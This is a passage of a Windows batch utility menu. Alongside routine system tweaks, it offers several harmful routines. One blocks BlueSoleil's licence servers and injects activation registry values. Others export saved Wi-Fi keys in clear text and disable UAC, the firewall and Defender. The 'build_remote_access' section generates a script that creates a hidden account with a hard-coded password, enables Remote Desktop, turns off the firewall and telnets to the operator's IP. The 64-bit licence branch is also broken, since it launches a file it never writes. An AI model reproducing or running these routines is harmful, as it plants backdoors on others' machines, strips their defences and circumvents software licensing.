:TELNET_DESACTIVE
Dism /online /Disable-Feature /FeatureName:TelnetClient
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:BlueSoleil_x64
IF "%Arquitetura%" equ "64 bits" (
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
Attrib -r -s -h %WINDIR%\system32\drivers\etc\hosts
Echo. >> %WINDIR%\System32\drivers\etc\hosts
FIND /C /I "license.bluesoleil.com" %WINDIR%\system32\drivers\etc\hosts
IF %ERRORLEVEL% NEQ 0 ECHO 127.0.0.1 license.bluesoleil.com >> %WINDIR%\System32\drivers\etc\hosts

FIND /C /I "license2.bluesoleil.com" %WINDIR%\system32\drivers\etc\hosts
IF %ERRORLEVEL% NEQ 0 ECHO 127.0.0.1 license2.bluesoleil.com >> %WINDIR%\System32\drivers\etc\hosts

FIND /C /I "license3.bluesoleil.com" %WINDIR%\system32\drivers\etc\hosts
IF %ERRORLEVEL% NEQ 0 ECHO 127.0.0.1 license3.bluesoleil.com >> %WINDIR%\System32\drivers\etc\hosts

FIND /C /I "bluesoleil.com" %WINDIR%\system32\drivers\etc\hosts
IF %ERRORLEVEL% NEQ 0 ECHO 127.0.0.1 bluesoleil.com >> %WINDIR%\System32\drivers\etc\hosts

FIND /C /I "www.bluesoleil.com" %WINDIR%\system32\drivers\etc\hosts
IF %ERRORLEVEL% NEQ 0 ECHO 127.0.0.1 www.bluesoleil.com >> %WINDIR%\System32\drivers\etc\hosts
Attrib +r +s +h %WINDIR%\system32\drivers\etc\hosts

Echo Windows Registry Editor Version 5.00 >> %~dp0regx86.reg
Echo. >> %~dp0regx86.reg
Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\BSPACode] >> %~dp0regx86.reg
Echo  "SN"=hex:46,72,23,57,2e,e6,e9,78,f8,db,f5,30,93,4a,d2,d9,f4,c0,7e,96,63,80,cd,\ >> %~dp0regx86.reg
Echo    7a,39,ca,36,ae,34,9c,29,0c,6e,0c,c6,3c,b0,ce,28,c4,2f,9e,4a,87,93,e8,57,6a,\ >> %~dp0regx86.reg
Echo    40,07,96,2e,0f,37,fc,b1,4f,b9,69,6c,20,2e,68,6a >> %~dp0regx86.reg
Echo  "ActivationID"=hex:50,45,45,32,4e,44,6d,43,4f,55,6d,43,4f,56,45,79,4f,44,64,32,\ >> %~dp0regx86.reg
Echo    4f,6b,56,78,4f,55,68,35,4e,6b,5a,33,4e,6c,4f,42,4f,55,4b,47,4f,44,4e,78,50,\ >> %~dp0regx86.reg
Echo    56,45,35,52,6b,53,44,53,6c,4f,42,53,44,57,43,4e,44,6c,36,50,45,4a,78,53,6b,\ >> %~dp0regx86.reg
Echo    6d,42,52,31,5a,30,4e,44,53,45,52,55,4a,7a,4f,44,69,45,4e,6b,4b,42,53,6c,4e,\ >> %~dp0regx86.reg
Echo    31,52,55,65,43,4e,6c,57,47,4f,31,4e,33,52,6c,53,46,4f,30,42,44,52,31,61,44,\ >> %~dp0regx86.reg
Echo    52,56,57,45,4f,30,52,79,4f,55,4b,42,50,44,4e,33,4e,6c,4b,45,50,45,4e,7a,4f,\ >> %~dp0regx86.reg
Echo    6b,5a,7a,4f,55,4f,46,52,55,52,31,4f,31,4a,7a,50,45,4e,33,53,44,68,36,52,55,\ >> %~dp0regx86.reg
Echo    4a,31,4f,56,57,42,4f,44,69,44,4f,56,4e,31,50,56,52,79,4e,6c,4f,46,4e,55,6d,\ >> %~dp0regx86.reg
Echo    42,50,44,53,42,4e,44,5a,7a,4f,6b,46,47,4e,31,4b,45,52,6c,5a,31,50,55,53,46,\ >> %~dp0regx86.reg
Echo    53,55,52,35,4e,30,53,46,4f,56,57,45,4f,31,4a,32,4f,6b,52,30,53,6b,4b,46,52,\ >> %~dp0regx86.reg
Echo    30,52,78,4f,56,5a,78,53,44,68,79,4e,6c,56,36,4f,55,65,46,4e,31,52,33,4f,44,\ >> %~dp0regx86.reg
Echo    4e,32,4f,31,4f,42,4e,6b,6c,35,52,6c,4a,79,50,55,52,36,53,56,5a,34,4f,6b,45,\ >> %~dp0regx86.reg
Echo    33,53,44,5a,32,4e,55,68,31,4f,45,4e,34,4f,30,61,44,4e,31,52,35,4f,30,45,79,\ >> %~dp0regx86.reg
Echo    4f,56,52,30,52,6b,65,44,53,55,53,43,50,45,56,79,4e,45,52,79,4f,78,41,49  >> %~dp0regx86.reg
START %~dp0regx64.reg
timeout 3 /nobreak > NUL 2>&1
DEL %~dp0regx64.reg
Echo: & Echo. Completed^^! & Echo: & Goto Inicio
) ELSE (
:BlueSoleil_x86
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
Attrib -r -s -h %WINDIR%\system32\drivers\etc\hosts
Echo. >> %WINDIR%\System32\drivers\etc\hosts
FIND /C /I "license.bluesoleil.com" %WINDIR%\system32\drivers\etc\hosts
IF %ERRORLEVEL% NEQ 0 ECHO 127.0.0.1 license.bluesoleil.com >> %WINDIR%\System32\drivers\etc\hosts

FIND /C /I "license2.bluesoleil.com" %WINDIR%\system32\drivers\etc\hosts
IF %ERRORLEVEL% NEQ 0 ECHO 127.0.0.1 license2.bluesoleil.com >> %WINDIR%\System32\drivers\etc\hosts

FIND /C /I "license3.bluesoleil.com" %WINDIR%\system32\drivers\etc\hosts
IF %ERRORLEVEL% NEQ 0 ECHO 127.0.0.1 license3.bluesoleil.com >> %WINDIR%\System32\drivers\etc\hosts

FIND /C /I "bluesoleil.com" %WINDIR%\system32\drivers\etc\hosts
IF %ERRORLEVEL% NEQ 0 ECHO 127.0.0.1 bluesoleil.com >> %WINDIR%\System32\drivers\etc\hosts

FIND /C /I "www.bluesoleil.com" %WINDIR%\system32\drivers\etc\hosts
IF %ERRORLEVEL% NEQ 0 ECHO 127.0.0.1 www.bluesoleil.com >> %WINDIR%\System32\drivers\etc\hosts
Attrib +r +s +h %WINDIR%\system32\drivers\etc\hosts

Echo Windows Registry Editor Version 5.00 >> %~dp0regx86.reg
Echo. >> %~dp0regx86.reg
Echo [HKEY_LOCAL_MACHINE\SOFTWARE\BSPACode] >> %~dp0regx86.reg
Echo  "SN"=hex:46,72,23,57,2e,e6,e9,78,f8,db,f5,30,93,4a,d2,d9,f4,c0,7e,96,63,80,cd,\ >> %~dp0regx86.reg
Echo    7a,39,ca,36,ae,34,9c,29,0c,6e,0c,c6,3c,b0,ce,28,c4,2f,9e,4a,87,93,e8,57,6a,\ >> %~dp0regx86.reg
Echo    40,07,96,2e,0f,37,fc,b1,4f,b9,69,6c,20,2e,68,6a >> %~dp0regx86.reg
Echo  "ActivationID"=hex:50,45,45,32,4e,44,6d,43,4f,55,6d,43,4f,56,45,79,4f,44,64,32,\ >> %~dp0regx86.reg
Echo    4f,6b,56,78,4f,55,68,35,4e,6b,5a,33,4e,6c,4f,42,4f,55,4b,47,4f,44,4e,78,50,\ >> %~dp0regx86.reg
Echo    56,45,35,52,6b,53,44,53,6c,4f,42,53,44,57,43,4e,44,6c,36,50,45,4a,78,53,6b,\ >> %~dp0regx86.reg
Echo    6d,42,52,31,5a,30,4e,44,53,45,52,55,4a,7a,4f,44,69,45,4e,6b,4b,42,53,6c,4e,\ >> %~dp0regx86.reg
Echo    31,52,55,65,43,4e,6c,57,47,4f,31,4e,33,52,6c,53,46,4f,30,42,44,52,31,61,44,\ >> %~dp0regx86.reg
Echo    52,56,57,45,4f,30,52,79,4f,55,4b,42,50,44,4e,33,4e,6c,4b,45,50,45,4e,7a,4f,\ >> %~dp0regx86.reg
Echo    6b,5a,7a,4f,55,4f,46,52,55,52,31,4f,31,4a,7a,50,45,4e,33,53,44,68,36,52,55,\ >> %~dp0regx86.reg
Echo    4a,31,4f,56,57,42,4f,44,69,44,4f,56,4e,31,50,56,52,79,4e,6c,4f,46,4e,55,6d,\ >> %~dp0regx86.reg
Echo    42,50,44,53,42,4e,44,5a,7a,4f,6b,46,47,4e,31,4b,45,52,6c,5a,31,50,55,53,46,\ >> %~dp0regx86.reg
Echo    53,55,52,35,4e,30,53,46,4f,56,57,45,4f,31,4a,32,4f,6b,52,30,53,6b,4b,46,52,\ >> %~dp0regx86.reg
Echo    30,52,78,4f,56,5a,78,53,44,68,79,4e,6c,56,36,4f,55,65,46,4e,31,52,33,4f,44,\ >> %~dp0regx86.reg
Echo    4e,32,4f,31,4f,42,4e,6b,6c,35,52,6c,4a,79,50,55,52,36,53,56,5a,34,4f,6b,45,\ >> %~dp0regx86.reg
Echo    33,53,44,5a,32,4e,55,68,31,4f,45,4e,34,4f,30,61,44,4e,31,52,35,4f,30,45,79,\ >> %~dp0regx86.reg
Echo    4f,56,52,30,52,6b,65,44,53,55,53,43,50,45,56,79,4e,45,52,79,4f,78,41,49 >> %~dp0regx86.reg
START %~dp0regx86.reg
timeout 3 /nobreak > NUL 2>&1
DEL %~dp0regx86.reg
Echo: & Echo. Completed^^! & Echo: & Goto Inicio
)

:LEVEL_BRIGHT
SET /p Brilho= Level of Bright (10-100):
powercfg -q > arq.txt
timeout 1 /nobreak > NUL 2>&1

FIND /C /I "062a286d-0181-4ee0-b296-86e5a1b77a5b" arq.txt > NUL 2>&1
IF %ERRORLEVEL% NEQ 1 powercfg -setacvalueindex 062a286d-0181-4ee0-b296-86e5a1b77a5b 7516b95f-f776-4464-8c53-06167f40cc99 aded5e82-b909-4619-9949-f5d71dac0bcb %Brilho% & powercfg -s 062a286d-0181-4ee0-b296-86e5a1b77a5b

FIND /C /I "381b4222-f694-41f0-9685-ff5bb260df2e" arq.txt > NUL 2>&1
IF %ERRORLEVEL% NEQ 1 powercfg -setacvalueindex 381b4222-f694-41f0-9685-ff5bb260df2e 7516b95f-f776-4464-8c53-06167f40cc99 aded5e82-b909-4619-9949-f5d71dac0bcb %Brilho% & powercfg -s 381b4222-f694-41f0-9685-ff5bb260df2e

FIND /C /I "3d554562-2b0b-4b1d-bda4-5566cd83a66d" arq.txt > NUL 2>&1
IF %ERRORLEVEL% NEQ 1 powercfg -setacvalueindex 3d554562-2b0b-4b1d-bda4-5566cd83a66d 7516b95f-f776-4464-8c53-06167f40cc99 aded5e82-b909-4619-9949-f5d71dac0bcb %Brilho% & powercfg -s 3d554562-2b0b-4b1d-bda4-5566cd83a66d

DEL arq.txt
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:EXPORTWIFI
md WiFiXML > NUL 2>&1
Netsh WLAN export profile key=clear folder="%cd%\WiFiXML" > NUL 2>&1
Echo. Exported^^!
START WiFiXML > NUL 2>&1
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:WiFiPassword
SET /p Name= WiFi Name (You must be connected):
netsh wlan show profile name="%name%" key=clear
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:UAC_ACTIVE
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:UAC_DESACTIVE
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:FireWallON
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
netsh advfirewall SET allprofiles state on > NUL 2>&1
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:FireWallOFF 
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
netsh advfirewall SET allprofiles state off > NUL 2>&1
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:WDefenderON
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /V DisableAntiSpyware /t REG_DWORD /D 0 /F > NUL 2>&1
Echo: & Echo. Completed^^! restart your system. & Echo: & Goto Inicio

:WDefenderOFF
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /V DisableAntiSpyware /t REG_DWORD /D 1 /F > NUL 2>&1
Echo: & Echo. Completed^^! restart your system. & Echo: & Goto Inicio

:SYSTEMBOOST
netsh winsock reset all 
netsh int 6to4 reset all
netsh int ipv4 reset all
netsh int ipv6 reset all
netsh int httpstunnel reset all
netsh int isatap reset all
netsh int portproxy reset all
netsh int tcp reset all
netsh int teredo reset all
ipconfig /release
ipconfig /renew
ipconfig /flushdns
ipconfig /registerdns
nbtstat -rr
netsh int ip reset all
netsh winsock reset
control findfast.cpl
Echo:

:TEMP_FILES_RECENT_FILES
DEL /s /f /q D:\temp\*.*
RD /S /Q D:\temp
DEL /s /f /q %temp%\*.*
RD /S /Q %temp%
FOR /D %%d IN ("%TEMP%\*.*") DO RD /S /Q "%%d"
DEL /S /Q /F "%Userprofile%\Configurações locais\Temporary Internet Files\*.*"   
FOR /D %%d IN ("%Userprofile%\Configurações locais\Temporary Internet Files\*.*") DO RD /S /Q "%%d"
DEL /S /Q /F "%userprofile%\Recent\*.*"
FOR /D %%d IN ("%Userprofile%\Recent\*.*") DO RD /S /Q "%%d"   

:TEMP_SYSTEM
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Goto NETRESET
DEL /F/S/Q %WINDIR%\*.TMP
DEL /F/S/Q %WINDIR%\TEMP\*.*   
FOR /D %%d IN ("%WINDIR%\TEMP\*.*") DO RD /S /Q "%%d"   
DEL /F/S/Q %WINDIR%\Prefetch\*.* 

:NETRESET
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Goto WINDOWSVERI
Echo:
netsh int ipv4 reset
netsh int tcp reset
netsh int ipv6 reset
netsh int httpstunnel reset
netsh int portproxy reset
netsh advfirewall reset
netsh winsock reset
netsh http flush logbuffer
netsh nap reset configuration
netsh branchcache reset
netsh lan reconnect
ipconfig /flushdns

:WINDOWSVERI
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Goto CCLEANER
sfc/scannow

:CCLEANER
cd C:\Program Files\CCleaner
IF EXIST "CCleaner.exe" (
START CCleaner.exe /AUTO
CD %userprofile%\Desktop\
Echo: & Echo. Completed^^! & Echo: & Goto Inicio
) ELSE (
CD %userprofile%\Desktop\
Echo: & Echo. Completed^^! & Echo: & Goto Inicio
)

:pr0jectWindows
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio

Echo:

echo | set /p=Internet Config
netsh interface ip show interfaces
RunDll32.exe InetCpl.cpl,ResetIEtoDefaults
netsh interface ipv4 set dnsservers name="Ehternet" static 8.8.8.8 > NUL 2>&1
netsh interface ipv4 add dnsservers name="Ehternet" 8.8.4.4 > NUL 2>&1
netsh interface ipv4 set dnsservers name="Wi-Fi" static 8.8.8.8 > NUL 2>&1
netsh interface ipv4 add dnsservers name="Wi-Fi" 8.8.4.4 > NUL 2>&1
echo  [OK]

echo | set /p=Turn off RealTimeProtection
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f > NUL 2>&1
echo  [OK]

echo | set /p=Turn off WinSAT
schtasks /Change /TN "Microsoft\Windows\Maintenance\WinSAT" /Disable > NUL 2>&1
echo  [OK]

FOR /F "tokens=2 delims==()" %%A in ('fsutil behavior query DisableDeleteNotify ^| find "="') do SET DDNotify=%%A
echo | set /p=Enable TRIM on your SSD
IF %DDNotify% EQU 0 (
fsutil behavior set DisableDeleteNotify 0 > NUL 2>&1
echo  [OK]
) ELSE (
echo  [OK]
)

echo | set /p=Turn off "You have new apps that can open this type of file" alert
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "NoNewAppAlert" /t REG_DWORD /d 1 /f > NUL 2>&1
echo  [OK]
 
IF not defined LTSB (
echo | set /p=Turn off "Look For An App In The Store" option
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "NoUseStoreOpenWith" /t REG_DWORD /d 1 /f > NUL 2>&1
echo  [OK]
)

echo | set /p=Open File Explorer to This PC instead of Quick Access
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "LaunchTo" /t REG_DWORD /d 1 /f > NUL 2>&1
echo  [OK]
 
echo | set /p=Do not show recently used files in Quick Access
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "ShowRecent" /t REG_DWORD /d 0 /f > NUL 2>&1
echo  [OK]

echo | set /p=Do not show frequently used folders in Quick Access
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "ShowFrequent" /t REG_DWORD /d 0 /f > NUL 2>&1
echo  [OK]

echo | set /p=Allow Development Mode
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock" /t REG_DWORD /f /v "AllowDevelopmentWithoutDevLicense" /d "1" > NUL 2>&1
echo  [OK]

rem RETPOLINE WINDOWS 10
rem reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverride /t REG_DWORD /d 0x400
rem reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverrideMask /t REG_DWORD /d 0x400

rem RETPOLINE WINDOWS SERVER
rem reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverride /t REG_DWORD /d 0x400
rem reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverrideMask /t REG_DWORD /d 0x401

rem INSTALL MODULE AND VERIFY
rem Install-Module -Name SpeculationControl
rem Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
rem Import-Module SpeculationControl
rem Get-SpeculationControlSettings

echo | set /p=Enable Retpoline
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverride /t REG_DWORD /d 0x400 /f > NUL 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverrideMask /t REG_DWORD /d 0x400 /f > NUL 2>&1
echo  [OK]

echo | set /p=Remove hiberfil.sys
powercfg -h off > NUL 2>&1
echo  [OK]

Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:WINUPDATEON
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
Echo:
net START wuauserv
net START bits
net START dosvc
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:WINUPDATEOFF
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
Echo:
net stop wuauserv
net stop bits
net stop dosvc
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:HIDE_DISK_DIRECTORY
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
(
echo LIST VOLUME
) > %~dp0script.txt
timeout 1 /nobreak > NUL 2>&1
diskpart /s %~dp0script.txt
timeout 1 /nobreak > NUL 2>&1
DEL %~dp0script.txt
Echo:
SET /p VNUMBER= Select Volume Number: 
SET /p VLETTER= Select Volume Letter: 
Echo:
(
echo SELECT VOLUME %VNUMBER%
echo REMOVE LETTER %VLETTER%
echo EXIT
) > %~dp0script.txt
timeout 1 /nobreak > NUL 2>&1
diskpart /s %~dp0script.txt
timeout 1 /nobreak > NUL 2>&1
DEL %~dp0script.txt
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:SHOW_HIDE_DISK_DIRECTORY
START diskmgmt.msc > NUL 2>&1
Echo: & Echo. Executed^^! & Echo. Completed^^! & Echo: & Goto Inicio

:TESTLOCALIPS
FOR /F "tokens=4 delims= " %%i in ('route print ^| find " 0.0.0.0"') do set localIp=%%i
FOR /F "tokens=1,2,3,4 delims=." %%a in ('echo.%localIp%') DO (
set ip_pesq=%%a.%%b.%%c.
)
Echo.
set /p Ini= Start IPv4 Test on (0 ~ 255 ): 
set /a mos=%ini%+1
set /p fin= Finish IPv4 Test on (%mos% ~ 255 ): 
Echo.
Echo  %ip_pesq%%Ini% ~ %ip_pesq%%fin%
Echo.
(
Echo. Dim Act :Set Act = CreateObject("Wscript.Shell"^)
Echo. Dim Wmi :Set Wmi = GetObject("winmgmts:\\.\root\cimv2"^)
Echo. Dim C1, Col, Obj, R
Echo. IF InStr(1,WScript.FullName,"cscript",1^) Then
Echo. PingComputer(^)
Echo. Else
Echo. MsgBox _
Echo. "Scrpit not found.",4128,"E R R O R"
Echo. End If
Echo. Function PingComputer(^)
Echo. For C1 = %Ini% To %fin% 
Echo. Set Ping = Wmi.ExecQuery( _
Echo. "Select * From Win32_PingStatus where Address = '%ip_pesq%"^& C1 ^&"'"^)
Echo. For Each Obj in Ping
Echo. IF IsNull(Obj.StatusCode^) Or Obj.StatusCode^<^>0 Then
Echo. WScript.Echo "Setup Offline : " ^& Obj.Address
Echo. Else
Echo. Wscript.Echo "Setup [ Online ] : " ^& Obj.Address
Echo. End IF  
Echo. Next 
Echo. Next 
Echo. R = Act.Popup( _
Echo. "You're interesting to restart the ping?",300, "A T T E N T I O N",4132^)
Echo. Select Case R
Echo. Case -1
Echo. Wscript.Echo vbCrLf ^& " Timeout, restarting the ping." ^& vbCrLf
Echo. PingComputer(^)
Echo. Case 6
Echo. Wscript.Echo vbCrLf ^& " Restarting the ping." ^& vbCrLf
Echo. PingComputer(^)
Echo. Case 7
Echo. WScript.Quit(0^) 
Echo. End Select
Echo. End Function 
) > %~dp0tlips.vbs 
CSCRIPT //NOLOGO %~dp0tlips.vbs
DEL /f %~dp0tlips.vbs 
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:LINUXCMD_ACTIVE
Dism /online /Enable-Feature /FeatureName:Microsoft-Windows-Subsystem-Linux /All
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:LINUXCMD_DESACTIVE
Dism /online /Disable-Feature /FeatureName:Microsoft-Windows-Subsystem-Linux /All
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

rem HOTSPOT:

:WIFIHOTSPOT
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
Echo:
SET /p "ssid= WiFi Name: "
SET /p "wifikey= WiFi Key: "
Echo:
netsh wlan SET hostednetwork mode=allow ssid="%SSID%" key=%WifiKey% keyusage=persistent
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:WIFIHOTSPOT_ON
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
Echo:
netsh wlan START hostednetwork
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:WIFIHOTSPOT_OFF
openfiles > NUL 2>&1 
IF NOT %ERRORLEVEL% EQU 0 Echo: & Echo. * You need Administrator Permission! & Echo: & Goto Inicio
Echo:
netsh wlan stop hostednetwork
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

rem FTP ACCESS:

:FTP_ACCESS
Dism /online /Enable-Feature /FeatureName:TFTP /All > NUL 2>&1
SET /p ServURL= URL:
SET /p ServLOG= Login:
SET /p pwd= Password:
ping -n 1 %ServURL% > NUL 2>&1
IF "%ERRORLEVEL%" == "0" (
START explorer "ftp://%ServLOG%:%pwd%@%ServURL%/"
) ELSE (
Echo: & Echo. Fail^^! & Echo: & Goto Inicio
)
Echo: & Echo. Completed^^! & Echo: & Goto Inicio
)

:LOAD_FTP_ACCESS
call:getvalue %INIFILE% "ftplogin" "" FTPLOGIN
call:getvalue %INIFILE% "ftppass" "" FTPPASS
call:getvalue %INIFILE% "ftpurl" "" FTPURL
IF "%ERRORLEVEL%" == "0" (
START explorer "ftp://%FTPLOGIN%:%FTPPASS%@%FTPURL%/"
) ELSE (
Echo: & Echo. Fail^^! & Echo: & Goto Inicio
)
Echo: & Echo. Completed^^! & Echo: & Goto Inicio
)

rem REMOTE ACCESS:

:build_remote_access
Echo:
SET /p EXTIP= Your External IP: 
(
Echo @Echo off
Echo net user /add An0nym0us bosshead
Echo @reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fAllowToGetHelp" /t REG_DWORD /d "1" /f
Echo cls
Echo @reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d "0" /f
Echo cls
Echo @reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v "An0nym0us" /d "0" /f
Echo netsh firewall SET opmode disable
Echo cls
Echo telnet %EXTIP%
) > %~dp0RA.bat
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

:connect_remote_access
Echo:
Echo. User: [An0nym0us]
Echo. Password: [bosshead]
Echo. Domain: [nul]
START mstsc.exe /f
Echo: & Echo. Completed^^! & Echo: & Goto Inicio

rem https://www.nirsoft.net/utils/wireless_network_watcher.html
:scan_remote_access
Echo:
arp -a
IF EXIST "%~dp0plugins\WNetWatcher.exe" (
START %~dp0plugins\WNetWatcher.exe
Echo: & Echo. Executed^^! & Echo: & Goto Inicio
) ELSE (
Echo: & Echo. Fail^^! & Echo: & Goto Inicio
)

:tools_remote_access
shutdown -i
Echo: & Echo. Completed^^! & Echo: & Goto Inicio
